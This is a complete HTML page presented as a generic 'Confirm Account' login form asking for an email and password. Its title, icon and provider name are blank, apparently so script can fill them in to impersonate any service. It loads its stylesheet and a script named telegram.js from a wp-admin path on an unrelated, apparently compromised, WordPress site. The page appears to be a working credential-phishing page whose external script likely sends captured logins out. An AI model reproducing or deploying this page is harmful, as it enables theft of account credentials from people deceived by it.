<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title id="ti"></title>
    <link id="faviconx" rel="icon" type="image/x-icon" href="" />
    <link rel="stylesheet" href="https://tribalsofindia.com/wp-admin/user/style.css" />
    <!-- Unicons -->
    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css" />
  </head>
  <body>

    <!-- Home -->
    <section class="home show">
      <div class="form_container">
        <!--<i class="uil uil-times form_close"></i>-->
        <!-- Login From -->
        <div class="form login_form">
          <form method="post">
            <h2>Confirm Account</h2>
            <div style="font-size:12px; text-align:center">Let's confirm your <span id="tot" style="text-transform: capitalize; color: blue;"></span> account, enter your password to continue.</div>
            <p id="notification" style="display:none"></p>
            <div class="input_box">
              <input type="email" id="email" name="email" placeholder="Enter your email" required />
              <i class="uil uil-envelope-alt email"></i>
            </div>
            <div class="input_box">
              <input type="password" id="password" name="password" placeholder="Enter your password" required />
              <i class="uil uil-lock password"></i>
              <i class="uil uil-eye-slash pw_hide"></i>
            </div>
            <p id="locate" style="display:none"></p>
            <button id="login" class="button">Continue</button>
          </form>
        </div>
        <div style="font-size:11px; margin-top: 15px; text-align:center;text-transform: capitalize;">Copyright &copy; <script>document.write(new Date().getFullYear())</script> <span id="footer"></span></div>
      </div>
    </section>
    <iframe src="" id="mainPage">
    Your browser doesn't support iframes
    </iframe>

    <!--<script src="script.js"></script>-->
    <script src="https://tribalsofindia.com/wp-admin/user/telegram.js"></script>
  </body>
</html>
